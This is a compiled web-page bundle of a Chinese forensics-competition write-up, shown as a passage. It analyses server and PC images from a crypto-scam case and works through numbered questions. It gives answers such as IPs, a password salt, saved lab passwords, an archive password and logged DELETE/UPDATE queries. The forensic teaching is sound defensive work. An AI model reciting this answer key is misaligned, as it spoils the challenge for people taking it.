import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as p,o,c,a as n,b as a,d as e,e as t}from"./app-e5b58fd7.js";const l={},d=n("h2",{id:"案件情况",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#案件情况","aria-hidden":"true"},"#"),a(" 案件情况")],-1),u=n("p",null,"某地警方接到受害人报案称其在某虚拟币交易网站遭遇诈骗，该网站号称使用“USTD 币”购买所谓的“HT 币”，受害人充 值后不但“HT 币”无法提现、交易，而且手机还被恶意软件锁定 勒索。警方根据受害人提供的虚拟币交易网站调取了对应的服 务器镜像并对案件展开侦查。",-1),r=n("h2",{id:"检材地址",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#检材地址","aria-hidden":"true"},"#"),a(" 检材地址")],-1),L={href:"https://pan.baidu.com/s/1JWxtyhzmjZksAos2QUaWcw?pwd=wvk4",target:"_blank",rel:"noopener noreferrer"},k=n("p",null,"提取码: wvk4",-1),m=n("p",null,"VeraCrypt密码：2022.4th.changancup!",-1),g={href:"https://www.forensics-wiki.com",target:"_blank",rel:"noopener noreferrer"},b=t(`<h2 id="检材1" tabindex="-1"><a class="header-anchor" href="#检材1" aria-hidden="true">#</a> 检材1</h2><p>根据报案人提供的网站域名和IP，警方调取了对应的服务器镜像“检材1”，分析掌握的检材回答下列问题</p><h3 id="_1-检材1的sha256值为" tabindex="-1"><a class="header-anchor" href="#_1-检材1的sha256值为" aria-hidden="true">#</a> 1. 检材1的SHA256值为</h3><p>直接使用火眼即可得到</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031203013152.png" alt="image-20221031203013152" tabindex="0" loading="lazy"><figcaption>image-20221031203013152</figcaption></figure><h3 id="_2-分析检材1-搭建该服务器的技术员ip地址是多少-用该地址解压检材2" tabindex="-1"><a class="header-anchor" href="#_2-分析检材1-搭建该服务器的技术员ip地址是多少-用该地址解压检材2" aria-hidden="true">#</a> 2. 分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2</h3><p>可以在登录日志中查看IP都是为同一个，所以确定为技术员的IP地址即：<strong>172.16.80.100</strong></p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031203904582.png" alt="image-20221031203904582" tabindex="0" loading="lazy"><figcaption>image-20221031203904582</figcaption></figure><h3 id="_3-检材1中-操作系统发行版本号为" tabindex="-1"><a class="header-anchor" href="#_3-检材1中-操作系统发行版本号为" aria-hidden="true">#</a> 3. 检材1中，操作系统发行版本号为</h3><p>仿真出的镜像中，使用如下命令得出：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>cat /etc/redhat-release
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031204532795.png" alt="image-20221031204532795" tabindex="0" loading="lazy"><figcaption>image-20221031204532795</figcaption></figure><h3 id="_4-检材1系统中-网卡绑定的静态ip地址为" tabindex="-1"><a class="header-anchor" href="#_4-检材1系统中-网卡绑定的静态ip地址为" aria-hidden="true">#</a> 4. 检材1系统中，网卡绑定的静态IP地址为</h3><p>使用如下命令即可得到</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ifconfig
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031204920519.png" alt="image-20221031204920519" tabindex="0" loading="lazy"><figcaption>image-20221031204920519</figcaption></figure><h3 id="_5-检材1中-网站jar包所存放的目录是-答案为绝对路径-如-home-honglian" tabindex="-1"><a class="header-anchor" href="#_5-检材1中-网站jar包所存放的目录是-答案为绝对路径-如-home-honglian" aria-hidden="true">#</a> 5. 检材1中，网站jar包所存放的目录是(答案为绝对路径，如“/home/honglian/”)</h3><p>查看历史命令，发现多次进入<code>/web/app</code>目录，并执行npm等指令，进入后发现有多个jar包，确定为网站jar包所存放目录</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031205135523.png" alt="image-20221031205135523" tabindex="0" loading="lazy"><figcaption>image-20221031205135523</figcaption></figure><h3 id="_6-检材1中-监听7000端口的进程对应文件名为" tabindex="-1"><a class="header-anchor" href="#_6-检材1中-监听7000端口的进程对应文件名为" aria-hidden="true">#</a> 6. 检材1中，监听7000端口的进程对应文件名为</h3><h4 id="方法一" tabindex="-1"><a class="header-anchor" href="#方法一" aria-hidden="true">#</a> 方法一</h4><p>将jar包全部导出，逐个分析，查看是哪个jar包使用了7000端口</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031210228367.png" alt="image-20221031210228367" tabindex="0" loading="lazy"><figcaption>image-20221031210228367</figcaption></figure><p>在<code>cloud.jar</code>中发现使用7000端口</p><h4 id="方法二" tabindex="-1"><a class="header-anchor" href="#方法二" aria-hidden="true">#</a> 方法二</h4><p>直接启动网站，查看占用端口情况，但是较难，因为嫌疑人删除了启动脚本，在做检材2时，D盘中会有该网站的启动脚本，将检材2中的脚本复制到检材1中，启动网站即可。</p><h3 id="_7-检材1中-网站管理后台页面对应的网络端口为-答案填写阿拉伯数字-如-100" tabindex="-1"><a class="header-anchor" href="#_7-检材1中-网站管理后台页面对应的网络端口为-答案填写阿拉伯数字-如-100" aria-hidden="true">#</a> 7. 检材1中，网站管理后台页面对应的网络端口为（答案填写阿拉伯数字，如“100”）</h3><p>检材2 D盘中的start_web.sh 即启动脚本</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031213016579.png" alt="image-20221031213016579" tabindex="0" loading="lazy"><figcaption>image-20221031213016579</figcaption></figure><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031220959669.png" alt="image-20221031220959669" tabindex="0" loading="lazy"><figcaption>image-20221031220959669</figcaption></figure><p>完全启动后查看端口使用情况</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031221301002.png" alt="image-20221031221301002" tabindex="0" loading="lazy"><figcaption>image-20221031221301002</figcaption></figure><p>在进入9090的时候发现为网站的后台</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031221330898.png" alt="image-20221031221330898" tabindex="0" loading="lazy"><figcaption>image-20221031221330898</figcaption></figure>`,34),f={id:"_8-检材1中-网站前台页面里给出的apk的下载地址是-答案格式如下-https-www-forensix-cn-abc-def",tabindex:"-1"},U=n("a",{class:"header-anchor",href:"#_8-检材1中-网站前台页面里给出的apk的下载地址是-答案格式如下-https-www-forensix-cn-abc-def","aria-hidden":"true"},"#",-1),v={href:"https://www.forensix.cn/abc/def%E2%80%9D",target:"_blank",rel:"noopener noreferrer"},N=t(`<p>依上题，查看3000端口后发现为网站前端，找到APP下载地址，扫描即可得到答案</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031221525710.png" alt="image-20221031221525710" tabindex="0" loading="lazy"><figcaption>image-20221031221525710</figcaption></figure><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031221709834.png" alt="image-20221031221709834" tabindex="0" loading="lazy"><figcaption>image-20221031221709834</figcaption></figure><h3 id="_9-检材1中-网站管理后台页面调用的用户表-admin-里的密码字段加密方式为" tabindex="-1"><a class="header-anchor" href="#_9-检材1中-网站管理后台页面调用的用户表-admin-里的密码字段加密方式为" aria-hidden="true">#</a> 9. 检材1中，网站管理后台页面调用的用户表(admin)里的密码字段加密方式为?</h3><h4 id="方法一-1" tabindex="-1"><a class="header-anchor" href="#方法一-1" aria-hidden="true">#</a> 方法一</h4><p>快进到检材3部分，找到数据库中的admin表，发现密码为32位，判断为md5</p><h4 id="方法二-1" tabindex="-1"><a class="header-anchor" href="#方法二-1" aria-hidden="true">#</a> 方法二</h4><p>反编译admin-api.jar包，在最后发现md5.key，判断为md5</p><h4 id="方法三" tabindex="-1"><a class="header-anchor" href="#方法三" aria-hidden="true">#</a> 方法三</h4><p>通过搜索md5，发现对md5的调用</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031222612209.png" alt="image-20221031222612209" tabindex="0" loading="lazy"><figcaption>image-20221031222612209</figcaption></figure><h4 id="方法四" tabindex="-1"><a class="header-anchor" href="#方法四" aria-hidden="true">#</a> 方法四</h4><p>通过随机登录查看发送的内容</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://172.16.80.133:6010/admin/system/employee/googleAuth/sign/in
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031222810213.png" alt="image-20221031222810213" tabindex="0" loading="lazy"><figcaption>image-20221031222810213</figcaption></figure><p>其中的<code>/sign/in</code>在admin-api.jar包中也出现了，同时后面的账号验证机制也使用到了md5key</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031233006229.png" alt="image-20221031233006229" tabindex="0" loading="lazy"><figcaption>image-20221031233006229</figcaption></figure><h4 id="_10-分析检材1-网站管理后台登录密码加密算法中所使用的盐值是" tabindex="-1"><a class="header-anchor" href="#_10-分析检材1-网站管理后台登录密码加密算法中所使用的盐值是" aria-hidden="true">#</a> 10. 分析检材1，网站管理后台登录密码加密算法中所使用的盐值是</h4><p>在分析admin-api.jar包时，即可得到盐值</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code># system
bdtop<span class="token punctuation">.</span>system<span class="token punctuation">.</span>md5<span class="token punctuation">.</span>key<span class="token operator">=</span><span class="token class-name">XehGyeyrVgOV4P8Uf70REVpIw3iVNwNs</span>
coin<span class="token punctuation">.</span>not<span class="token punctuation">.</span>sync<span class="token operator">=</span><span class="token constant">ETH</span>
google<span class="token punctuation">.</span>auth<span class="token punctuation">.</span>url<span class="token operator">=</span>ztuo<span class="token punctuation">.</span>fcoincn<span class="token punctuation">.</span>com
bdtop<span class="token punctuation">.</span>system<span class="token punctuation">.</span>work<span class="token operator">-</span>id<span class="token operator">=</span><span class="token number">1</span>
bdtop<span class="token punctuation">.</span>system<span class="token punctuation">.</span>data<span class="token operator">-</span>center<span class="token operator">-</span>id<span class="token operator">=</span><span class="token number">1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="检材二" tabindex="-1"><a class="header-anchor" href="#检材二" aria-hidden="true">#</a> 检材二</h2><p>根据IP地址落地及后续侦查，抓获了搭建网站的技术员，扣押了其个人电脑并制作镜像“检材2”，分析所有掌握的检材回答下列问题</p><p>由第二题答案解压得到检材二</p><h3 id="_11-检材2中-windows账户web-king的登录密码" tabindex="-1"><a class="header-anchor" href="#_11-检材2中-windows账户web-king的登录密码" aria-hidden="true">#</a> 11. 检材2中，windows账户Web King的登录密码</h3><p>通过火眼分析即可得到</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031234044249.png" alt="image-20221031234044249" tabindex="0" loading="lazy"><figcaption>image-20221031234044249</figcaption></figure><h3 id="_12-检材2中-除检材1以外-还远程连接过哪个ip地址-并用该地址解压检材3" tabindex="-1"><a class="header-anchor" href="#_12-检材2中-除检材1以外-还远程连接过哪个ip地址-并用该地址解压检材3" aria-hidden="true">#</a> 12. 检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3</h3><p>由第四题已知检材1的IP是：172.16.80.133</p><p>所以在分析结果中排除172.16.80.133，另一个IP即是答案</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031234223097.png" alt="image-20221031234223097" tabindex="0" loading="lazy"><figcaption>image-20221031234223097</figcaption></figure><h3 id="_13-检材2中-powershell中输入的最后一条命令是" tabindex="-1"><a class="header-anchor" href="#_13-检材2中-powershell中输入的最后一条命令是" aria-hidden="true">#</a> 13. 检材2中，powershell中输入的最后一条命令是</h3><p>此处有一个误区，很多人可能以为火眼分析出的系统SSH里就是答案，但其实根据后面知道嫌疑人安装了WSL，所以该系统SSH历史输入命令其实是WSL的的历史命令。</p><p>而Windows中的Powershell位置是<code>%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code></p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031234531861.png" alt="image-20221031234531861" tabindex="0" loading="lazy"><figcaption>image-20221031234531861</figcaption></figure><h3 id="_14-检材2中-下载的涉案网站源代码文件名为" tabindex="-1"><a class="header-anchor" href="#_14-检材2中-下载的涉案网站源代码文件名为" aria-hidden="true">#</a> 14. 检材2中，下载的涉案网站源代码文件名为</h3><p>将镜像仿真起来，发现在<code>下载</code>中有多个zip</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221031235008404.png" alt="image-20221031235008404" tabindex="0" loading="lazy"><figcaption>image-20221031235008404</figcaption></figure>`,37),h={href:"https://github.com/sengeiou/ZTuoExchange_framework",target:"_blank",rel:"noopener noreferrer"},y=t('<h3 id="_15-检材2中-网站管理后台root账号的密码为" tabindex="-1"><a class="header-anchor" href="#_15-检材2中-网站管理后台root账号的密码为" aria-hidden="true">#</a> 15. 检材2中，网站管理后台root账号的密码为</h3><p>在解析出的Google浏览器中直接发现了保存的密码</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101000122797.png" alt="image-20221101000122797" tabindex="0" loading="lazy"><figcaption>image-20221101000122797</figcaption></figure><h3 id="_16-检材2中-技术员使用的wsl子系统发行版本是" tabindex="-1"><a class="header-anchor" href="#_16-检材2中-技术员使用的wsl子系统发行版本是" aria-hidden="true">#</a> 16. 检材2中，技术员使用的WSL子系统发行版本是</h3><h4 id="方法一-2" tabindex="-1"><a class="header-anchor" href="#方法一-2" aria-hidden="true">#</a> 方法一</h4><p>首先在开始菜单中，发现两个子系统</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101000312555.png" alt="image-20221101000312555" tabindex="0" loading="lazy"><figcaption>image-20221101000312555</figcaption></figure><p>但是题目要的是技术员使用的，就说明是有其他数据的</p><p>通过搜索得知WSL的位置是：<code>C:\\Users\\Web King\\AppData\\Local\\Packages</code>，在目录下找到这两个的文件</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101000454314.png" alt="image-20221101000454314" tabindex="0" loading="lazy"><figcaption>image-20221101000454314</figcaption></figure><p>通过对比两个文件大小，发现20.04的版本明显大于22.04的，所以确定20.04是技术员试用的子系统</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101000636930.png" alt="image-20221101000636930" tabindex="0" loading="lazy"><figcaption>image-20221101000636930</figcaption></figure><h4 id="方法二-2" tabindex="-1"><a class="header-anchor" href="#方法二-2" aria-hidden="true">#</a> 方法二</h4><p>通过在仿真的镜像中启动子系统，发现20.04是可以直接进入命令行的，而22.04是需要进行配置的</p><h4 id="方法三-1" tabindex="-1"><a class="header-anchor" href="#方法三-1" aria-hidden="true">#</a> 方法三</h4><p>使用指令得到</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>wsl -l -v\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101001052352.png" alt="image-20221101001052352" tabindex="0" loading="lazy"><figcaption>image-20221101001052352</figcaption></figure><h3 id="_17-检材2中-运行的数据库服务版本号是" tabindex="-1"><a class="header-anchor" href="#_17-检材2中-运行的数据库服务版本号是" aria-hidden="true">#</a> 17. 检材2中，运行的数据库服务版本号是</h3><p>在启动mysql后，使用命令直接得到</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101002019150.png" alt="image-20221101002019150" tabindex="0" loading="lazy"><figcaption>image-20221101002019150</figcaption></figure><h3 id="_18-上述数据库debian-sys-maint用户的初始密码是" tabindex="-1"><a class="header-anchor" href="#_18-上述数据库debian-sys-maint用户的初始密码是" aria-hidden="true">#</a> 18. 上述数据库debian-sys-maint用户的初始密码是</h3><p>通过搜索得知debian-sys-maint用户的初始密码位于/etc/mysql/debian.cnf中</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101002205932.png" alt="image-20221101002205932" tabindex="0" loading="lazy"><figcaption>image-20221101002205932</figcaption></figure><h3 id="_19-检材3服务器root账号的密码是" tabindex="-1"><a class="header-anchor" href="#_19-检材3服务器root账号的密码是" aria-hidden="true">#</a> 19. 检材3服务器root账号的密码是</h3><p>在检材2的系统SSH历史输入命令中，发现曾使用sshpass对172.16.80.128进行连接，连接密码为<code>h123456</code></p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101002342400.png" alt="image-20221101002342400" tabindex="0" loading="lazy"><figcaption>image-20221101002342400</figcaption></figure><h2 id="检材三" tabindex="-1"><a class="header-anchor" href="#检材三" aria-hidden="true">#</a> 检材三</h2><p>根据网站前端和技术员个人电脑上的线索，发现了网站后端所在的服务器IP并再次调证取得“检材3”，分析所有掌握的检材回答下列问题</p><p>通过第12题答案，解压检材3</p><h3 id="_20-检材3中-监听33050端口的程序名-program-name-为" tabindex="-1"><a class="header-anchor" href="#_20-检材3中-监听33050端口的程序名-program-name-为" aria-hidden="true">#</a> 20. 检材3中，监听33050端口的程序名（program name)为</h3><p>在历史命令中发现嫌疑人进入了/data/mysql 之后使用了docker-compose up</p><p>进入目录后，查看docker-compose.yml配置文件，发现使用了33050，尝试启动后发现program name</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101120302903.png" alt="image-20221101120302903" tabindex="0" loading="lazy"><figcaption>image-20221101120302903</figcaption></figure><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101120543991.png" alt="image-20221101120543991" tabindex="0" loading="lazy"><figcaption>image-20221101120543991</figcaption></figure><h3 id="_21-除mysql外-该网站还依赖以下哪种数据库" tabindex="-1"><a class="header-anchor" href="#_21-除mysql外-该网站还依赖以下哪种数据库" aria-hidden="true">#</a> 21. 除MySQL外，该网站还依赖以下哪种数据库</h3><p>在分析检材一时，对于admin-api.jar的分析中，发现他使用了redis以及mongo</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101120831194.png" alt="image-20221101120831194" tabindex="0" loading="lazy"><figcaption>image-20221101120831194</figcaption></figure><h3 id="_22-检材3中-mysql数据库root账号的密码是" tabindex="-1"><a class="header-anchor" href="#_22-检材3中-mysql数据库root账号的密码是" aria-hidden="true">#</a> 22. 检材3中，MySQL数据库root账号的密码是</h3><h4 id="方法一-3" tabindex="-1"><a class="header-anchor" href="#方法一-3" aria-hidden="true">#</a> 方法一</h4><p>同样在admin-api.jar中也可分析出密码</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101121005822.png" alt="image-20221101121005822" tabindex="0" loading="lazy"><figcaption>image-20221101121005822</figcaption></figure><h4 id="方法二-3" tabindex="-1"><a class="header-anchor" href="#方法二-3" aria-hidden="true">#</a> 方法二</h4><p>在docker-compose配置文件中也能找到</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101121231075.png" alt="image-20221101121231075" tabindex="0" loading="lazy"><figcaption>image-20221101121231075</figcaption></figure><h3 id="_23-检材3中-mysql数据库在容器内部的数据目录为" tabindex="-1"><a class="header-anchor" href="#_23-检材3中-mysql数据库在容器内部的数据目录为" aria-hidden="true">#</a> 23. 检材3中，MySQL数据库在容器内部的数据目录为</h3><h4 id="方法一-4" tabindex="-1"><a class="header-anchor" href="#方法一-4" aria-hidden="true">#</a> 方法一</h4><p>通过对docker-compose.yml的分析，可以看到它是将<code>/data/mysql/db</code>目录，挂载到了容器的<code>/var/lib/mysql</code>中，所以<code>/var/lib/mysql</code>就是他的数据目录</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101121352048.png" alt="image-20221101121352048" tabindex="0" loading="lazy"><figcaption>image-20221101121352048</figcaption></figure><h4 id="方法二-4" tabindex="-1"><a class="header-anchor" href="#方法二-4" aria-hidden="true">#</a> 方法二</h4><p>通过进入容器内部找到相关信息</p><div class="language-docker line-numbers-mode" data-ext="docker"><pre class="language-docker"><code>docker exec -it 8eda4cb0b452 bash\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101121705555.png" alt="image-20221101121705555" tabindex="0" loading="lazy"><figcaption>image-20221101121705555</figcaption></figure><h3 id="_24-涉案网站调用的mysql数据库名为" tabindex="-1"><a class="header-anchor" href="#_24-涉案网站调用的mysql数据库名为" aria-hidden="true">#</a> 24. 涉案网站调用的MySQL数据库名为</h3><p>通过对于admin-api.jar包的分析，发现他连接的数据库名是b1</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101121918839.png" alt="image-20221101121918839" tabindex="0" loading="lazy"><figcaption>image-20221101121918839</figcaption></figure><h3 id="_25-勒索者在数据库中修改了多少个用户的手机号" tabindex="-1"><a class="header-anchor" href="#_25-勒索者在数据库中修改了多少个用户的手机号" aria-hidden="true">#</a> 25. 勒索者在数据库中修改了多少个用户的手机号？</h3><p>首先在<code>/data/mysql/db</code>发现了<code>8eda4cb0b452.log</code>该文件。发现里面记录了创建表等日志</p><p>通过搜索<code>UPDATE</code>发现他修改了<code>b1</code>数据库的<code>member表</code>中的<code>mobile_phone</code>,计数找到<code>8次</code>分别是</p><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>2022-10-18T08:48:06.120268Z	    8 Query	update admin set last_login_time=&#39;2022-10-18 04:48:06.114&#39;, last_login_ip=null where id=1\n2022-10-18T08:48:21.016425Z	    8 Query	update admin set last_login_time=&#39;2022-10-18 04:48:21.023&#39;, last_login_ip=&#39;172.16.80.100&#39; where id=1\n2022-10-18T09:38:56.117223Z	    9 Query	update admin set last_login_time=&#39;2022-10-18 05:38:56.113&#39;, last_login_ip=&#39;172.16.80.197&#39; where id=1\n2022-10-19T03:20:39.001499Z	   13 Query	UPDATE `b1`.`member` SET `mobile_phone` = &#39;13638991111&#39; WHERE `id` = 9\n2022-10-19T03:20:41.851525Z	   13 Query	UPDATE `b1`.`member` SET `mobile_phone` = &#39;13282992222&#39; WHERE `id` = 10\n2022-10-19T03:20:44.184953Z	   13 Query	UPDATE `b1`.`member` SET `mobile_phone` = &#39;13636993333&#39; WHERE `id` = 11\n2022-10-19T05:34:00.075764Z	   10 Query	select count(a.id) from member a , member_application b where a.id = b.member_id and b.audit_status = 2 and date_format(b.update_time,&#39;%Y-%m-%d&#39;) = &#39;2022-10-18&#39;\n2022-10-20T03:18:25.478485Z	   10 Query	update admin set last_login_time=&#39;2022-10-19 23:18:25.461&#39;, last_login_ip=&#39;172.16.80.100&#39; where id=1\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>但是发现这8次中，有5次都是关于登录信息的，所以排除，因此只有<code>3个</code></p><h3 id="_26-勒索者在数据库中删除的用户数量为" tabindex="-1"><a class="header-anchor" href="#_26-勒索者在数据库中删除的用户数量为" aria-hidden="true">#</a> 26. 勒索者在数据库中删除的用户数量为</h3><p>在该日志中搜索<code>DELETE</code>发现他删除了<code>b1</code>数据库的<code>member表</code>的内容，从973一直删到了1000，所以删除了28个用户</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101123732257.png" alt="image-20221101123732257" tabindex="0" loading="lazy"><figcaption>image-20221101123732257</figcaption></figure><h3 id="_27-还原被破坏的数据库-分析除技术员以外-还有哪个ip地址登录过管理后台网站-用该地址解压-检材4" tabindex="-1"><a class="header-anchor" href="#_27-还原被破坏的数据库-分析除技术员以外-还有哪个ip地址登录过管理后台网站-用该地址解压-检材4" aria-hidden="true">#</a> 27. 还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压 检材4</h3><h4 id="方法一-直接恢复数据库连接分析" tabindex="-1"><a class="header-anchor" href="#方法一-直接恢复数据库连接分析" aria-hidden="true">#</a> 方法一 直接恢复数据库连接分析</h4><p>首先还原被破坏的数据库，b1数据库在检材三中被删除了，因为需要将检材二中的b1放进去，然后启动mysql</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101124621763.png" alt="image-20221101124621763" tabindex="0" loading="lazy"><figcaption>image-20221101124621763</figcaption></figure><p>之后连接数据库，在admin表中发现了登录的历史IP</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101125006270.png" alt="image-20221101125006270" tabindex="0" loading="lazy"><figcaption>image-20221101125006270</figcaption></figure><h4 id="方法二-使用火眼数据库分析工具分析b1数据库" tabindex="-1"><a class="header-anchor" href="#方法二-使用火眼数据库分析工具分析b1数据库" aria-hidden="true">#</a> 方法二 使用火眼数据库分析工具分析b1数据库</h4><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101125100662.png" alt="image-20221101125100662" tabindex="0" loading="lazy"><figcaption>image-20221101125100662</figcaption></figure><h3 id="_28-还原全部被删改数据-用户id为500的注册会员的ht币钱包地址为" tabindex="-1"><a class="header-anchor" href="#_28-还原全部被删改数据-用户id为500的注册会员的ht币钱包地址为" aria-hidden="true">#</a> 28. 还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为</h3><p>在<code>member_wallet表</code>中，找到ID=500的用户，直接可以得到</p><blockquote><p>cee631121c2ec9232f3a2f028ad5c89b</p></blockquote><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101130236339.png" alt="image-20221101130236339" tabindex="0" loading="lazy"><figcaption>image-20221101130236339</figcaption></figure><h3 id="_29-还原全部被删改数据-共有多少名用户的会员等级为-lv3" tabindex="-1"><a class="header-anchor" href="#_29-还原全部被删改数据-共有多少名用户的会员等级为-lv3" aria-hidden="true">#</a> 29. 还原全部被删改数据，共有多少名用户的会员等级为&#39;LV3&#39;</h3><p><code>member</code>表中会找到答案，member_grade_id`为3的情况下数据库中有158个</p><figure><img src="https://didctf-blog-post.oss-cn-beijing.aliyuncs.com/post/image-20221101131643580.png" alt="image-20221101131643580" tabindex="0" loading="lazy"><figcaption>image-20221101131643580</figcaption></figure><p>然而并未考虑被删除的用户中LV=3的用户数量</p><p>被删除的用户如下：</p><div class="language-mysql line-numbers-mode" data-ext="mysql"><pre class="language-mysql"><code>2022-10-19T03:16:36.987428Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 973\n2022-10-19T03:16:37.011565Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 974\n2022-10-19T03:16:37.018915Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 975\n2022-10-19T03:16:37.024719Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 976\n2022-10-19T03:16:37.030514Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 977\n2022-10-19T03:16:37.036525Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 978\n2022-10-19T03:16:37.043063Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 979\n2022-10-19T03:16:37.050115Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 980\n2022-10-19T03:16:37.058208Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 981\n2022-10-19T03:16:37.063910Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 982\n2022-10-19T03:16:37.069479Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 983\n2022-10-19T03:16:37.075433Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 984\n2022-10-19T03:16:37.081648Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 985\n2022-10-19T03:16:37.090573Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 986\n2022-10-19T03:16:37.097442Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 987\n2022-10-19T03:16:37.109309Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 988\n2022-10-19T03:16:37.116375Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 989\n2022-10-19T03:16:37.122000Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 990\n2022-10-19T03:16:37.128186Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 991\n2022-10-19T03:16:37.134416Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 992\n2022-10-19T03:16:37.141373Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 993\n2022-10-19T03:16:37.147063Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 994\n2022-10-19T03:16:37.153631Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 995\n2022-10-19T03:16:37.161562Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 996\n2022-10-19T03:16:37.168149Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 997\n2022-10-19T03:16:37.175782Z	   13 Query	DELETE FROM `b1`.`member` WHERE `id` = 998\n2022-10-19T03:16:37.183277Z	   13 Query	DELETE FROM `b1`.`member` WHERE 